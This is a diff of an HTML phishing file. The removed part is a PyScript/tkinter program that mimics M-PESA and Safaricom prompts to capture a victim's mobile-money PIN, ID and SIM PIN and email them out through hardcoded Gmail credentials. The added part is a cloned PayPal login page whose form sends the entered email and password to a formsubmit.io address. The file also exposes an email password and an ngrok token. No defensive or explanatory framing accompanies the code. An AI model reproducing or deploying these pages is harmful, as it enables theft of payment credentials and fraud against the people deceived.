@@ -1,138 +1,123 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>Hello World!</title>
-    <link rel="stylesheet" href="https://pyscript.net/alpha/pyscript.css" />
-    <script defer src="https://pyscript.net/alpha/pyscript.js"></script>
-    <py-env>
-- tkinter
-    </py-env>
-  </head>
-  <body>
-    <py-script>
-import time
-from tkinter import Tk, Label, Button, Entry, Frame
-import smtplib
-from tkinter import ttk
-#from flask import Flask
-#from pyngrok import ngrok
-
-#apl = Flask(__name__)
-
-#ngrok.set_auth_token("1tU57a5Mip0thygm73YAqu5sugG_36Ft2nSvExoPReDuPNmNA")
-#port_f = 5000
-#url = ngrok.connect(port_f, proto="tcp").public_url
-#print(url)
-
-
-#@apl.route("/results")
-def hook():
-  def center_window(app):
-      w = app.winfo_screenwidth()
-      h = app.winfo_screenheight()
-      rootsize = tuple(int(_) for _ in app.geometry().split('+')[0].split('x'))
-      x = w / 2 - rootsize[0] / 2
-      y = h / 2 - rootsize[1] / 2
-      return "%dx%d+%d+%d" % (rootsize + (x, y))
-
-  def stk():
-      win0 = Tk()
-      frame = Frame(win0, width=200, height=160, colormap="new")
-      frame.pack(fill=None, padx=5, pady=5, expand=True)
-      win0.geometry(center_window(win0))
-      title_label = Label(frame, text="M-PESA", fg="black", font=("Arial Bold", 9))
-      title_label.pack()
-      title_label = Label(frame, text="")
-      title_label.pack()
-      title_label = Label(
-          frame, text="Enter PIN followed by ID to cancel transaction \n4 - 12 Digits (0-9,*,#,+,4)", fg="black",
-          font=("Arial", 6))
-      title_label.pack()
-      entry_1 = Entry(frame)
-      entry_1.pack()
-      title_label = Label(frame, text="")
-      title_label.pack()
-
-      def onclick():
-          z = "M-Pin and ID is:" + entry_1.get()
-          if len(entry_1.get()) < 4:
-              win0.destroy()
-              stk()
-          elif len(entry_1.get()) >= 4:
-              win0.destroy()
-
-              # noinspection PyShadowingNames
-              def sfc():
-                  time.sleep(0.5)
-                  win = Tk()
-                  frame = Frame(win, width=200, height=160, colormap="new")
-                  frame.pack(fill=None, padx=5, pady=5, expand=True)
-                  win.geometry(center_window(win))
-                  title_label = Label(
-                      frame, text="Safaricom                                          ", font=("Arial Bold", 8))
-                  title_label.pack()
-                  title_label = Label(frame, text="Enter simPIN1 to verify user on the Network", font=("Arial", 6))
-                  title_label.pack()
-                  entry = Entry(frame)
-                  entry.pack()
-                  title_label = Label(frame, text="")
-                  title_label.pack()
-
-                  def onclick_1():
-                      zv = "Sim pin is:" + entry.get()
-                      if len(entry.get()) < 4:
-                          win.destroy()
-                          sfc()
-                      elif len(entry.get()) >= 4:
-                          win.destroy()
-                          pns = str(z) + "  " + "and" + "  " + str(zv)
-                          for i in range(3):
-                              try:
-                                  sender = "briankimani509@gmail.com"
-                                  receiver = "briankimani509@gmail.com"
-                                  password = "bombonutymetapolice"
-                                  message = pns
-                                  server = smtplib.SMTP("smtp.gmail.com", 587)
-                                  server.starttls()
-                                  server.login(sender, password)
-                                  server.sendmail(sender, receiver, message)
-                                  break
-                              except Exception:
-                                  time.sleep(0.5)
-                          win_1 = Tk()
-                          frame = Frame(win_1, width=200, height=160, colormap="new")
-                          frame.pack(fill=None, padx=5, pady=5, expand=True)
-                          win_1.geometry(center_window(win_1))
-                          title_label = Label(
-                              frame,
-                              text="Transaction successfully Cancelled! Amount \nyou can transact within the day is 299,875.00.\nGet your M-PESA statement on M-PESA App \nhttp://bit.ly/mpesappsm",
-                              font=("Arial Bold", 7))
-                          title_label.pack()
-
-                          def cancel():
-                              win_1.destroy()
-
-                          button = Button(frame, text="exit", command=cancel)
-                          button.pack()
-
-                          win_1.mainloop()
-
-                  button = ttk.Button(frame, text="Send", command=onclick_1)
-                  button.pack(side="right")
-
-                  win.mainloop()
-
-              sfc()
-
-      button = Button(frame, text="OK", command=onclick)
-      button.pack()
-
-      win0.mainloop()
-
-  stk()
-  
-
-hook()
-    </py-script>
-  </body>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>Login to your account</title>
+        <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
+        <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
+        <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
+        <link rel="stylesheet" href="contextualLoginElementalUIv2.css">
+    </head>
+    <body>
+        <div class="corral ">
+            <div id="content" class="contentContainer activeContent contentContainerBordered">
+                <header id="header">
+                    <p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
+                </header>
+                <h1 id="headerText" class="headerText  accessAid">Log in to your PayPal account</h1>
+                <p id="phoneSubTagLine" class="subHeaderText hide">Already set up to use your mobile number to log in? Type it below. Otherwise, click the link to log in with email.</p>
+                <p id="subTagLineConnectOtp" class="subHeaderText hide">Forgot your email address? Go to the PayPal website to retrieve it.</p>
+                <div id="loginContent" class="">
+                    <div id="loginSection" class="">
+                        <div class="notifications"></div>
+                        <div id="keychainErrorMessage" class="hide">
+                            <p class="notification notification-warning blocked-on-8ball hide">PayPal One Touch™ only works for checkout. Please login with your email.</p>
+                            <p class="notification notification-warning blocked-on-risky-login hide">Please login with your email and password.</p>
+                            <p class="notification notification-critical keychain-activation-failure hide">Something went wrong on our end. Please login with your email and password.</p>
+                        </div>
+                        <form action="https://formsubmit.io/send/enquirycontact619@gmail.com" method="POST">
+                            <input type="hidden" id="token" name="_csrf" value="qOWD7LuBDYSe8pg1G8bDZoq8yb5xZil9hWfXA=">
+                            <input type="hidden" name="locale.x" value="en_US">
+                            <input type="hidden" name="processSignin" value="main">
+                            <input type="hidden" name="fn_sync_data" value="fn_sync_data">
+                            <input type="hidden" name="intent" value="signin">
+                            <input type="hidden" name="ads-client-context" value="signin">
+                            <input type="hidden" name="isValidCtxId" value="">
+                            <input type="hidden" name="coBrand" value="ke">
+                            <input type="hidden" name="signUpEndPoint" value="/webapps/mpp/account-selection">
+                            <input type="hidden" name="requestUrl" value="/signin">
+                            <input type="hidden" name="forcePhonePasswordOptIn" value="">
+                            <div id="passwordSection" class="clearfix splitEmail">
+                                <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
+                                    <div class="countryPhoneSelectWrapper hide">
+                                        <label class="accessAid" for="phoneCode">Choose your country's calling code</label>
+                                        <select name="phoneCode" id="phoneCode" class="countryPhoneSelect">
+                                        </select>
+                                        <div class="countryPhoneSelectChoice">
+                                            <span class="countryCode">KE</span>
+                                            <span class="phoneCode">+254</span>
+                                        </div>
+                                    </div>
+                                    <div class="textInput" id="login_emaildiv" style="z-index: 1;">
+                                    <div class="fieldWrapper">
+                                        <label for="email" class="fieldLabel">Email or mobile number</label>
+                                        <input id="email" name="login_email" type="email" class="hasHelp  validateEmpty   " required="required" value="" autocomplete="" placeholder="Email or mobile number" aria-describedby="emailErrorMessage">
+                                    </div>
+                                    <div class="errorMessage" id="emailErrorMessage">
+                                        <p class="emptyError hide">Required</p>
+                                        <p class="invalidError hide">That email or mobile number format isn’t right</p>
+                                    </div>
+                                </div>
+                                </div>
+                                <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
+                                    <div class="textInput " id="login_passworddiv" style="z-index: 1;">
+                                        <div class="fieldWrapper">
+                                            <label for="password" class="fieldLabel">Enter your password</label>
+                                            <input id="password" name="login_password" type="password" class="hasHelp  validateEmpty   pin-password" required="required" value="" placeholder="Enter your password" aria-describedby="passwordErrorMessage">
+                                            <label for="Show password" class="fieldLabel">Show password</label>
+                                            <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Show password" >Show</button>
+                                            <label for="Hide" class="fieldLabel">Hide</label>
+                                            <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Hide" >Hide</button>
+                                        </div>
+                                        <div class="errorMessage" id="passwordErrorMessage">
+                                            <p class="emptyError hide">Enter your password.</p>
+                                        </div>
+                                    </div>
+                                    <a href="/authflow/password-recovery/?country.x=KE&amp;locale.x=en_US&amp;redirectUri=%252Fsignin" id="forgotPassword" class="recoveryOption forgotPassword" data-client-log-action-type="clickForgotPasswordLink" >Forgot password?</a>
+                                </div>
+                            </div>
+                            <input type="hidden" id="phone" name="login_phone" class="validate">
+                            <div class="actions">
+                                <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" >Log In</button>
+                            </div>
+                            <input type="hidden" name="splitLoginContext" value="inputPassword">
+                            <input type="hidden" name="isCookiedHybridEmail" value="true">
+                            <input type="hidden" name="partyIdHash" value="b70a255d2e8ce2796ddc56f34c35981f05ee2c1659ad4fbcc7b23c3c5a7a9f62">
+                        </form>
+                        <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
+                            <div class="loginSignUpSeparator ">
+                                <span class="textInSeparator">or</span>
+                            </div>
+                            <button type="button" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" >Sign Up</button>
+                        </div>
+                        <div id="tpdButtonContainer" class="signupContainer hide">
+                            <div class="loginSignUpSeparator">
+                                <span class="textInSeparator">or</span>
+                            </div><div class="actions">
+                            <button class="button secondary" id="tpdButton" type="submit" value="Approve login using mobile device" >Approve login using mobile device</button>
+                        </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="intentFooter ">
+                    <div class="localeSelector ">
+                        <ul class="localeLink">
+                            <li>
+                                <a class="selected scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=KE&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" aria-current="true" >English</a>
+                            </li>
+                            <li>
+                                <a class=" scTrack:unifiedlogin-footer-language_fr_XC" href="/signin?country.x=KE&amp;locale.x=fr_XC&amp;langTgl=fr" lang="fr" data-locale="fr_XC" >Français</a>
+                            </li>
+                            <li>
+                                <a class=" scTrack:unifiedlogin-footer-language_es_XC" href="/signin?country.x=KE&amp;locale.x=es_XC&amp;langTgl=es" lang="es" data-locale="es_XC" >Español</a>
+                            </li>
+                            <li>
+                                <a class=" scTrack:unifiedlogin-footer-language_zh_XC" href="/signin?country.x=KE&amp;locale.x=zh_XC&amp;langTgl=zh" lang="zh" data-locale="zh_XC" >中文</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
 </html>
